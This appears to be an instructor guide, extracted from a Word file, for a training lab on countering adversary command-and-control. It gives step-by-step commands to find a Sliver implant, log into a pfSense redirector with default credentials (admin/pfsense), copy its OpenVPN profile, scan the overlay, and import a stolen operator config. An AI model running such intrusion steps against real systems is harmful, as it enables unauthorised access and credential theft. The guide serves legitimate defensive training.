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SquidLab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SquidLab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr/>
        <w:t>1.2 Module length</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr/>
        <w:t>90 minutes (1.5 hours)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr/>
        <w:t>Schedule slot is 90 minutes.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ELO-72:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Adapt enumeration, tooling, and collection to the identified constraint when a standard toolkit is inadequate.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ELO-74:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Given a constrained host, characterize the environment and complete assigned collection.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B03.M06:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Resource and State-Constrained Systems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SquidLab target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(required)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classroom-shared</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> (required)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">Complete </w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t>SquidLab — Setup Guide</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> and pass </w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t>SquidLab — Verification</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr/>
        <w:t>Issue Alpine.tar / WSL import steps. Do not hand this instructor guide to students.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">Range clue, if any: redirector </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
        <w:t>172.16.173.100</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> only. Do not pre-brief C2 or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
        <w:t>192.168.135.0/24</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">Tools on seats: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">, browser, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
        <w:t>ssh</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
        <w:t>scp</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">, OpenVPN (Windows or Linux NIC), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
        <w:t>sliver-client</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
        <w:t>strings</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
        <w:t>find</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t>. Wireshark optional.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">Student access is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
        <w:t>week3-constrained</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">. The student Windows seat is hostname </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
        <w:t>victim</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> at </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
        <w:t>80.90.100.11/24</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">. Students start with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
        <w:t>wsl -d Alpine</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> there. Shared instructor access is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
        <w:t>classroom-shared</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">: redirector </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
        <w:t>172.16.173.100</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">, C2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
        <w:t>172.16.173.101</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">, Win-Svr02 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
        <w:t>172.16.173.200</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t>.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Issued Alpine WSL distro on the ops-station Windows seat (primary access: recovered image / existing implant on that distro)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">Lab LAN </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
        <w:t>172.16.173.0/24</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr/>
        <w:t>No extra kit beyond what the brief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classroom-shared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"Hunting passed you a recovered Alpine WSL image. Start on that image. Follow evidence to the adversary's own path. Collection first; no effects on the C2."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Do:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Confirm every seat can </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
        <w:t>wsl -d Alpine</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t>. Sketch implant → redirector → overlay → C2 on the board without filling IPs yet.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you record before you hunt off the image?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Host identity, user, working path, and process list on the issued distro.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"Hunting passed you a recovered Alpine WSL image. Start on that image. Follow evidence to the adversary's own path. Collection first; no effects on the C2."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Show:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Student-brief task list and reporting headings. Do not project implant path or redirector IP.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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
        <w:t>wsl -d Alpine</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> on each seat.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you record before you hunt off the image?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Host identity, user, working path, and process list on the issued distro.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Host-based analysis of the recovered Alpine image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"Start on the issued distro. Identity first, then find what hunting recovered."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Student-brief Tasks 1–2. Do not display </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>/root/.bash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Timebox. If a student is stuck after broad </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>ls</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t>/</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>find</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t>, hint at hidden files in the root home — not the filename.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the implant is not already running as a service you were handed?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They had to locate a file/process themselves; the beacon is not waiting as an obvious named service.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve">The Sliver implant is </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>not running</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> when the Alpine WSL image is first launched unless persist already fired. Students must locate it.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>ls -la /root/</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> lists all directory entries, including hidden names (</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>-a</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve">). </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>find /root -type f</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> walks files under root's home. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>2&gt;/dev/null</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> hides permission noise:</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>```bash</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>hostname; id; pwd; ps aux</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>ls -la /root/</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>find /root -type f 2&gt;/dev/null</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>find / -name ".*" -type f 2&gt;/dev/null | head</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>```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the callback and recon the first hop</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr>
                <w:i/>
              </w:rPr>
              <w:t>Duration: 10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"Prove where it calls. Then recon that host only."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Optional Wireshark on the WSL/Hyper-V NIC. Do not announce </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>172.16.173.100</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> unless a team has already found it.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Accept static (</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>strings</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t>) or dynamic (capture) paths.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not scan the whole lab LAN first?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Evidence already named one callback; wide scans waste the clock and leave scope.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>strings</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> prints printable bytes from a binary so students can grep IPv4 without a debugger:</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>```bash</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>strings /root/.bash | grep -E '([0-9]{1,3}\.){3}[0-9]{1,3}'</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>```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Initial access via leftover defaults</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr>
                <w:i/>
              </w:rPr>
              <w:t>Duration: 10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"Redirectors and demo firewalls often keep vendor defaults. Try the web UI and SSH from evidence, not from a password list we issued."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Browser to </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>https://172.16.173.100</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> only after they have the IP.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they try </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>root</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> on SSH first, point them at the pfSense admin account the GUI uses.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makes default credentials a Counterstrike-relevant find rather than a gimme?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Adversary (or lab) leftover admin access is how you enter </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:i/>
              </w:rPr>
              <w:t>their</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> redirector, not a student-only backdoor.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve">- URL: </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>https://172.16.173.100</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve">- Credentials: </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>admin</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> / </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>pfsense</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>```bash</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>ssh admin@172.16.173.100</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t># Password: pfsense</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>```</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve">(SSH as </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>root</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> may work on some builds; the documented leftover is </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>admin</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> / </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>pfsense</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t>.)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Enumerate NAT and OpenVPN</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr>
                <w:i/>
              </w:rPr>
              <w:t>Duration: 10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"You are on their redirector. Find how traffic is forwarded and whether they tunnel."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Firewall → NAT → Port Forward; VPN → OpenVPN.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Let them read the internal/redspace IP out of NAT. Do not name </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>192.168.135.1</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> first.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does a port-forward to an RFC1918 address behind the WAN tell you?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hidden C2/redspace hop; the WAN host is a redirector, not the whole infrastructure.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Recover the OpenVPN cert and join the overlay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"Certificate material is usually on disk if the tunnel is already a client."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find</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> for </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>*.ovpn</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>scp</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> copies a remote file to the local cwd.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WSL cannot create </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>tun</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>TUNSETIFF</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> fails), run OpenVPN on Windows instead. Confirm </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>tun0</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> in </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>192.168.135.0/24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must further C2 work happen on the tunnel?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Host firewall/iptables drop lab-LAN paths to staging and Sliver.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>```bash</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>find /root /tmp /var -name "*.ovpn" 2&gt;/dev/null</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>ls -la /root/.tmp/</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>cat /root/.tmp/redir-cert.ovpn</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>scp admin@172.16.173.100:/root/.tmp/redir-cert.ovpn .</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>sudo openvpn --config redir-cert.ovpn</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>```</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>openvpn --config</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> uses that file as the client profile (remote, certs, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>ta.key</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve">). Success: TLS </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>VERIFY OK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tun0</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve">, address in </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>192.168.135.0/24</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t>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Redspace discovery and stolen operator config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"You are on their overlay. Find the C2 and any staging they left."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nmap</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> from </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>tun0</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>curl</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> fetches HTTP without a browser.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Force the </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>lhost</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> edit to </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>192.168.135.1</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> if the cfg still lists </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>172.16.173.101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would a stolen operator cfg fail until they change an IP?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It still points at a LAN address not reachable from the overlay.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>```bash</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>ip addr show tun0</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>nmap -sn 192.168.135.0/24</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>nmap -Pn -sV -p- 192.168.135.1</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>curl http://192.168.135.1:8000/</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>```</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve">Port </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>8000/tcp</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> is a Python HTTP staging tree (</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>/opt/squid-stage</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve">). Download the Sliver operator cfg. Replace listed IP with </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>`192.168.135.1`</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t>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Connect, survey, report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"Import as an operator. Answer the 5 Ws. Name an effect. Do not pull the trigger."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sliver-client import</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> loads a multiplayer config. Then </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
              <w:t>sessions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beacons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jobs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operators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Stop anyone killing Octagon-SECDEF or listeners. Collect reports.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in-scope versus a recommended effect?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Survey and report are in-scope; killing listeners or implants is recommendation-only.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>```bash</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>sliver-client import &lt;modified-operator.cfg&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>sliver-client</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>sessions</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>beacons</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>jobs</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>operators</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>info</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>```</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>| Question | What to examine |</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t>|----------|-----------------|</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve">| </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Who</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> | Operator accounts, active sessions |</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve">| </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>What</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> | Listeners, implant types, beacon/session list |</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve">| </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>When</w:t>
            </w:r>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve"> | Session/beacon timestamps, uptime |</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr/>
            <w:r>
              <w:rPr/>
              <w:t xml:space="preserve">| </w:t>
